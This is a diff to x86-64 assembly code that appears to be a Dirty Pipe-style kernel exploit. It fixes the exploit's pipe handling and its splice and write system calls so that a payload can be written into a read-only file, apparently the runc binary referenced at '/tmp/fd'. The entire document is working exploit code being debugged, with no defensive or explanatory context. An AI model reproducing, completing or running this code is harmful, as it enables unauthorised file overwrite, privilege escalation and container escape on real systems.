@@ -13,7 +13,7 @@ main:
 ; *******************
 prepare_pipe:
     mov rax, SYS_PIPE
-    lea rdi, [rsp]                                       ; p
+    mov rdi, rsp                                       ; p
     syscall
 
 ; *******************
@@ -24,7 +24,7 @@ write:
     mov rax, SYS_WRITE
     mov rdx, PAGE_SIZE
     lea rsi, [rsp+8]                                ;buffer
-    lea rdi, [rsp+4]                                ; p[1]
+    mov edi, [rsp+4]
     syscall
 
 ; *******************
@@ -35,7 +35,7 @@ read:
     mov rax, SYS_READ
     mov rdx, PAGE_SIZE
     lea rsi,  [rsp+8]                         ;buffer
-    lea rdi,  [rsp]                          ; p[0]
+    mov edi,  [rsp]                          ; p[0]
     syscall
 
 ; *******************
@@ -57,13 +57,13 @@ open:
 ; splice
 ; *******************
 splice: 
+    mov rax, SYS_SPLICE
     mov r9, 0                                                     ; flags
     mov r8, 1                                                     ; len
     mov rcx, NULL                                           ; off_out
-    lea rdi, [rsp+4]                                                    ; p[1]
+    mov edx, [rsp+4]                                          ; p[1]
     mov rsi,   0                                                  ; offset
     mov rdi,  qword [fileDesc]                          ; fd
-    mov rax, SYS_SPLICE
     syscall
 
 ; *******************
@@ -73,8 +73,8 @@ splice:
 write_payload: 
     mov rdx, MAX_LENGTH                                ; length
     mov rsi,   payload                                             ; payload
-    lea rdi, [rsp+4]                                       ; p[1]
-    mov rax, SYS_READ
+    mov edi, [rsp+4]                                       ; p[1]
+    mov rax, SYS_WRITE
     syscall
 
 ; *******************
@@ -138,7 +138,7 @@ section .data
     O_RDONLY           equ    000000q        ; read only
     BUFF_SIZE          equ 255
     PAGE_SIZE           equ 65536
-    MAX_LENGTH equ 4095
+    MAX_LENGTH equ 10
     ; ********string*******
     runc db '/tmp/fd',NULL ; runc fd
     writeDone      db       "Write Completed.", LF, NULL
